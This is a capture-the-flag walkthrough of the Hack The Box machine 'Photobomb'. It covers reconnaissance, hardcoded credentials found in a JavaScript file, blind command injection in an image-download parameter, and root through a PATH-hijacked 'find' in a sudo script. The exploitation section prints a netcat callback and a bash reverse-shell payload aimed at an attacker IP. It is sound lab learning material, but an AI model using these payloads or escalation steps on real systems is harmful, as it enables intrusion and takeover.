---
title: Photobomb
tags:
  - HackTheBox
  - Easy
  - Linux
  - Command-Injection
  - Path_Hijacking
date: 2025-06-04T00:00:01Z
---
![](Pasted%20image%2020250604202929.png)

## Reconnaissance

First, I added the new host to my known ones:

```shell
sudo echo "10.10.11.182 photobomb.htb" | sudo tee -a /etc/hosts
```

Then, I performed a Nmap scan:

```shell
ports=$(nmap -p- --min-rate=1000 -T4 photobomb.htb | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) 

nmap -p$ports -sC -sV photobomb.htb > sC.txt

[redacted]
PORT     STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e2:24:73:bb:fb:df:5c:b5:20:b6:68:76:74:8a:b5:8d (RSA)
|   256 04:e3:ac:6e:18:4e:1b:7e:ff:ac:4f:e3:9d:d2:1b:ae (ECDSA)
|_  256 20:e0:5d:8c:ba:71:f0:8c:3a:18:19:f2:40:11:d2:9e (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Photobomb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

So I checked its website:

![](Pasted%20image%2020250604203211.png)

There is a hidden endpoint `/printer` which prompts a login panel:

![](Pasted%20image%2020250604203249.png)

There are credentials inside `photobomb.js`:

![](Pasted%20image%2020250604203356.png)

> Credentials: `pH0t0:b0Mb!`

![](Pasted%20image%2020250604203515.png)

We can download photos:

![](Pasted%20image%2020250604203610.png)

So I'll capture the request with CAIDO:

![](Pasted%20image%2020250604203814.png)

![](Pasted%20image%2020250604204010.png)

## Exploitation

This website may be vulnerable to Blind Command Injection. I tried the following payload inside the parameter `filetype`:

```shell
jpg;nc%2010.10.14.22%20666
```

![](Pasted%20image%2020250604205029.png)

![](Pasted%20image%2020250604205106.png)

So now I'll use the following payload to gain RCE:

```shell
bash%20-c%20'bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.22%2F666%200%3E%261'
```

![](Pasted%20image%2020250604205453.png)

![](Pasted%20image%2020250604205507.png)

### User flag

![](Pasted%20image%2020250604205636.png)

## Privilege Escalation

First I checked for `sudo -l`:

```shell
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
```

There is a weird file under `/opt` called `cleanup.sh` with the following content:

```shell
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```

There is a path hijacking vulnerability in the last command of the script. That means that `bash` will search the directories specified in the `$PATH` environment variable looking for a binary named `find`. Typically, it’ll find `find` in `/usr/bin/find`. Here is where the `SETENV` variable makes sense.

Basically I can create a find script that gives me a shell as root. To do so, I'll create the binary:

```shell
echo -e '#!/bin/bash\n\nbash' > /tmp/find
chmod +x /tmp/find
```

Now I’ll run `cleanup.sh` as root but with the `PATH` variable including the current directory at the front of the path:

```shell
sudo PATH=/tmp/$:$PATH /opt/cleanup.sh
```

### Root flag

![](Pasted%20image%2020250604211507.png)

==Machine pwned!==